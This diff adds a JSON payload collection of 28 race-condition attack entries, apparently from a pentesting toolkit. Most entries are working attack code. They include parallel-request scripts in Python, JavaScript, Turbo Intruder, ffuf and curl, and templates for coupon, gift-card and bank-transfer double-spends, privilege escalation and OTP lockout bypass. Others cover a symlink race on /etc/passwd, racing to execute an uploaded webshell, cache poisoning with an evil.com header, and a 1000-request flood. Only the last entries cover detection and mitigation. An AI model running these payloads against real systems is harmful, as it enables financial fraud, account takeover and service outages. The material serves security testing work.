@@ -1,0 +1,236 @@
+{
+  "meta": {
+    "name": "Race Condition Attacks",
+    "icon": "⚡",
+    "description": "Race condition payloads and proof-of-concept templates for limit overrun, TOCTOU, and concurrent request attacks.",
+    "version": "1.0",
+    "updated": "2025-01-01",
+    "total": 28
+  },
+  "payloads": [
+    {
+      "id": "rc001",
+      "code": "GET /api/coupon/apply?code=SAVE50 HTTP/1.1\n# Send 20 simultaneous requests via Turbo Intruder last-byte sync",
+      "description": "Limit-overrun: apply single-use coupon multiple times via parallel requests",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["coupon", "discount", "limit", "turbo-intruder"]
+    },
+    {
+      "id": "rc002",
+      "code": "POST /api/transfer HTTP/1.1\nContent-Type: application/json\n\n{\"from\":\"accountA\",\"to\":\"accountB\",\"amount\":1000}\n# Race 10-50 identical requests — balance check and debit not atomic",
+      "description": "Double-spend: race account transfer to overdraw balance beyond limit",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["double-spend", "balance", "transfer", "financial"]
+    },
+    {
+      "id": "rc003",
+      "code": "POST /api/vote HTTP/1.1\n{\"item_id\":42}\n# Send 15 concurrent requests with same session — vote counter race",
+      "description": "Vote/like counter race: cast multiple votes with one account",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["vote", "like", "counter", "concurrent"]
+    },
+    {
+      "id": "rc004",
+      "code": "POST /api/redeem-gift-card HTTP/1.1\n{\"code\":\"GIFT-XXXX-YYYY\"}\n# 25 parallel requests — credit added multiple times before DB update",
+      "description": "Gift card redemption race: redeem same code multiple times for duplicate credit",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["gift-card", "credit", "redemption"]
+    },
+    {
+      "id": "rc005",
+      "code": "# Turbo Intruder last-byte sync technique (Python/Burp)\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=20,\n                           requestsPerConnection=1,\n                           pipeline=False)\n    for i in range(20):\n        engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], learn=0)\n    engine.openGate('1')",
+      "description": "Turbo Intruder last-byte synchronization for precise race window exploitation",
+      "category": "technique",
+      "platform": ["burp", "tool"],
+      "tags": ["turbo-intruder", "last-byte-sync", "gate", "burp"]
+    },
+    {
+      "id": "rc006",
+      "code": "import asyncio, aiohttp\nasync def race(url, data, n=20):\n    async with aiohttp.ClientSession() as s:\n        tasks = [s.post(url, json=data) for _ in range(n)]\n        return await asyncio.gather(*tasks)\nasyncio.run(race('https://target.com/api/apply', {'code':'PROMO50'}))",
+      "description": "Python asyncio parallel POST race — send N requests simultaneously",
+      "category": "technique",
+      "platform": ["python", "script"],
+      "tags": ["asyncio", "aiohttp", "parallel", "python"]
+    },
+    {
+      "id": "rc007",
+      "code": "# HTTP/2 single-packet attack — all requests in one TCP frame\ncurl --http2 -X POST https://target.com/api/redeem \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"code\":\"GIFT123\"}' &\n# Repeat 20x, all queued before server processes any",
+      "description": "HTTP/2 single-packet attack: fits multiple requests in one frame, near-zero jitter",
+      "category": "technique",
+      "platform": ["http2", "curl"],
+      "tags": ["http2", "single-packet", "low-jitter"]
+    },
+    {
+      "id": "rc008",
+      "code": "GET /reset-password?token=abc123 HTTP/1.1\n# Race token check + invalidation — use token twice before it expires",
+      "description": "Password reset token race: use a single-use token multiple times before invalidation",
+      "category": "toctou",
+      "platform": ["http", "web"],
+      "tags": ["password-reset", "token", "single-use", "toctou"]
+    },
+    {
+      "id": "rc009",
+      "code": "# TOCTOU: check file existence then write — race between check and write\n# Attacker creates symlink between check and write operations\nln -s /etc/passwd /tmp/upload_1234\n# Server checks /tmp/upload_1234 (passes), then writes to target via symlink",
+      "description": "TOCTOU symlink race: create symlink between file existence check and write operation",
+      "category": "toctou",
+      "platform": ["linux", "filesystem"],
+      "tags": ["toctou", "symlink", "filesystem", "lfi"]
+    },
+    {
+      "id": "rc010",
+      "code": "POST /api/withdraw HTTP/1.1\n{\"amount\": 100}\n# T1: balance check (reads 100) → T2: balance check (reads 100) → T1: debit → T2: debit\n# Result: 200 withdrawn from 100 balance",
+      "description": "Classic TOCTOU withdraw: two concurrent reads before either write commits",
+      "category": "toctou",
+      "platform": ["http", "api"],
+      "tags": ["withdraw", "database", "toctou", "atomic"]
+    },
+    {
+      "id": "rc011",
+      "code": "# Multi-endpoint race: Step 1 and Step 2 of different workflows\n# Race POST /confirm-order with GET /cancel-order\n# If cancel processes after confirm check but before stock decrement → free item",
+      "description": "Multi-endpoint race: interleave two different API flows to exploit ordering assumptions",
+      "category": "multi-endpoint",
+      "platform": ["http", "api"],
+      "tags": ["multi-endpoint", "order", "cancel", "workflow"]
+    },
+    {
+      "id": "rc012",
+      "code": "# Race account state change:\n# Endpoint A: /api/upgrade-plan (sets role=premium)\n# Endpoint B: /api/create-content (checks role)\n# Race B immediately after A — B executes before DB write from A commits",
+      "description": "Account state race: exploit window between privilege grant and DB commit",
+      "category": "multi-endpoint",
+      "platform": ["http", "api"],
+      "tags": ["privilege", "role", "state", "database"]
+    },
+    {
+      "id": "rc013",
+      "code": "# Registration + login race\n# 1. POST /register {user: alice} — triggers email verification pending\n# 2. Simultaneously POST /login {user: alice, pass: x}\n# Race window: user exists in DB but email_verified=false not yet set",
+      "description": "Registration bypass race: login before email verification flag is written",
+      "category": "multi-endpoint",
+      "platform": ["http", "api"],
+      "tags": ["registration", "email-verification", "bypass", "auth"]
+    },
+    {
+      "id": "rc014",
+      "code": "ffuf -u https://target.com/api/apply -X POST \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"code\":\"PROMO\"}' \\\n  -w /dev/null -t 50 -rate 0",
+      "description": "ffuf parallel race using high thread count and zero rate limit",
+      "category": "technique",
+      "platform": ["tool", "ffuf"],
+      "tags": ["ffuf", "parallel", "fuzzer"]
+    },
+    {
+      "id": "rc015",
+      "code": "# Burp Suite Repeater — Send group in parallel\n# 1. Add 20 identical requests to Repeater group\n# 2. Right-click group → 'Send group in parallel (single-packet attack)'\n# Works best with HTTP/2 targets",
+      "description": "Burp Repeater parallel group send — built-in single-packet race technique",
+      "category": "technique",
+      "platform": ["burp", "tool"],
+      "tags": ["burp", "repeater", "parallel", "single-packet"]
+    },
+    {
+      "id": "rc016",
+      "code": "POST /api/session/elevate HTTP/1.1\nAuthorization: Bearer <low_priv_token>\n{\"action\": \"become_admin\"}\n# Race 30 requests — privilege check and flag set not in same transaction",
+      "description": "Privilege escalation race: concurrent elevation requests during non-atomic check-then-set",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["privilege-escalation", "admin", "elevation", "atomic"]
+    },
+    {
+      "id": "rc017",
+      "code": "# OTP/2FA bypass race\n# 1. POST /login/otp {code: 123456} — OTP validated, session created\n# 2. Race 30 requests with wrong OTP simultaneously\n# Race window: if rate-limit counter increments non-atomically → bypass lockout",
+      "description": "OTP rate-limit bypass race: concurrent attempts before lockout counter commits",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["otp", "2fa", "rate-limit", "bypass", "lockout"]
+    },
+    {
+      "id": "rc018",
+      "code": "import threading\nresults = []\ndef send(session, url):\n    r = session.post(url, json={'code': 'ONCE'})\n    results.append(r.json())\nthreads = [threading.Thread(target=send, args=(requests.Session(), URL)) for _ in range(20)]\n[t.start() for t in threads]; [t.join() for t in threads]",
+      "description": "Python threading race PoC using shared session for concurrent requests",
+      "category": "technique",
+      "platform": ["python", "script"],
+      "tags": ["threading", "python", "concurrent", "poc"]
+    },
+    {
+      "id": "rc019",
+      "code": "const reqs = Array.from({length: 20}, () =>\n  fetch('/api/apply', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify({code: 'PROMO50'}),\n    credentials: 'include'\n  })\n);\nPromise.all(reqs).then(rs => Promise.all(rs.map(r => r.json()))).then(console.log);",
+      "description": "Browser-side JS Promise.all race PoC — useful for CSWSH + race combo",
+      "category": "technique",
+      "platform": ["javascript", "browser"],
+      "tags": ["fetch", "promise", "javascript", "browser", "csrf"]
+    },
+    {
+      "id": "rc020",
+      "code": "# Detect race window with timing analysis\n# 1. Baseline: measure single request latency (e.g. 120ms)\n# 2. Look for operations with check-then-act pattern in source/docs\n# 3. Target: non-atomic DB reads (SELECT ... then UPDATE separately)\n# 4. Ideal window: >1ms (network jitter < window)",
+      "description": "Race window detection methodology: identify TOCTOU patterns via timing and source analysis",
+      "category": "detection",
+      "platform": ["methodology"],
+      "tags": ["detection", "timing", "methodology", "toctou"]
+    },
+    {
+      "id": "rc021",
+      "code": "# File upload race condition\n# 1. Upload malicious file (e.g. shell.php) — server scans then deletes\n# 2. Race GET /uploads/shell.php between upload complete and scan/delete\nfor i in $(seq 1 100); do curl -s https://target.com/uploads/shell.php & done; wait",
+      "description": "File upload scan race: execute uploaded file before antivirus scan deletes it",
+      "category": "toctou",
+      "platform": ["linux", "http"],
+      "tags": ["file-upload", "antivirus", "race", "webshell"]
+    },
+    {
+      "id": "rc022",
+      "code": "# Cache poisoning via race\n# Race two requests with different Host headers to same CDN cache key\n# If CDN caches between first request headers and content write → poison cache\nGET / HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: evil.com",
+      "description": "Cache poisoning race: exploit CDN caching timing to poison response with attacker host",
+      "category": "multi-endpoint",
+      "platform": ["http", "cdn"],
+      "tags": ["cache-poisoning", "cdn", "host-header", "race"]
+    },
+    {
+      "id": "rc023",
+      "code": "# Session fixation + race\n# 1. Attacker gets session ID before victim logs in\n# 2. Victim authenticates — server regenerates session (brief window)\n# 3. Race requests with old session ID during regeneration window",
+      "description": "Session regeneration race: use old session ID during brief regeneration window",
+      "category": "toctou",
+      "platform": ["http", "session"],
+      "tags": ["session", "fixation", "regeneration", "auth"]
+    },
+    {
+      "id": "rc024",
+      "code": "# Inventory race condition\nPOST /api/purchase HTTP/1.1\n{\"product_id\": 999, \"qty\": 1}\n# Race 30 requests when stock=1 — oversell if inventory check not locked\n# Result: negative inventory, multiple orders fulfilled",
+      "description": "Inventory oversell race: purchase more than available stock via concurrent requests",
+      "category": "limit-overrun",
+      "platform": ["http", "api", "ecommerce"],
+      "tags": ["inventory", "stock", "oversell", "ecommerce"]
+    },
+    {
+      "id": "rc025",
+      "code": "# Referral bonus race\nPOST /api/referral/claim HTTP/1.1\n{\"referral_code\": \"FRIEND123\"}\n# Race 20 requests — referral marked used after bonus credited, not before",
+      "description": "Referral bonus double-claim race: claim referral reward multiple times before code marked used",
+      "category": "limit-overrun",
+      "platform": ["http", "api"],
+      "tags": ["referral", "bonus", "promo", "double-claim"]
+    },
+    {
+      "id": "rc026",
+      "code": "# Connection pool exhaustion via race\n# Send 1000 slow requests to exhaust DB connection pool\n# Causes legitimate race conditions in connection acquisition logic\nfor i in $(seq 1 1000); do\n  curl -s --max-time 30 'https://target.com/api/slow-query' &\ndone; wait",
+      "description": "Connection pool exhaustion: flood with slow requests to induce race conditions in pool management",
+      "category": "detection",
+      "platform": ["linux", "http"],
+      "tags": ["dos", "connection-pool", "exhaustion", "slow"]
+    },
+    {
+      "id": "rc027",
+      "code": "# GraphQL batching race\nPOST /graphql HTTP/1.1\n[\n  {\"query\":\"mutation { redeemCoupon(code: \\\"SAVE50\\\") { success } }\"},\n  {\"query\":\"mutation { redeemCoupon(code: \\\"SAVE50\\\") { success } }\"},\n  {\"query\":\"mutation { redeemCoupon(code: \\\"SAVE50\\\") { success } }\"}\n]",
+      "description": "GraphQL batching race: send multiple identical mutations in one request for internal race",
+      "category": "multi-endpoint",
+      "platform": ["graphql", "api"],
+      "tags": ["graphql", "batching", "mutation", "internal-race"]
+    },
+    {
+      "id": "rc028",
+      "code": "# Mitigation testing checklist\n# [ ] SELECT ... FOR UPDATE / row-level locking?\n# [ ] Atomic DB operations (INCR, CAS, transactions)?\n# [ ] Idempotency keys on APIs?\n# [ ] Rate limiting with Redis INCR (atomic)?\n# [ ] Optimistic locking with version fields?\n# [ ] Distributed locks (Redis SETNX, Redlock)?",
+      "description": "Race condition mitigation checklist: verify atomic operations, locking, and idempotency",
+      "category": "detection",
+      "platform": ["methodology"],
+      "tags": ["mitigation", "checklist", "locking", "atomic", "idempotency"]
+    }
+  ]
+}
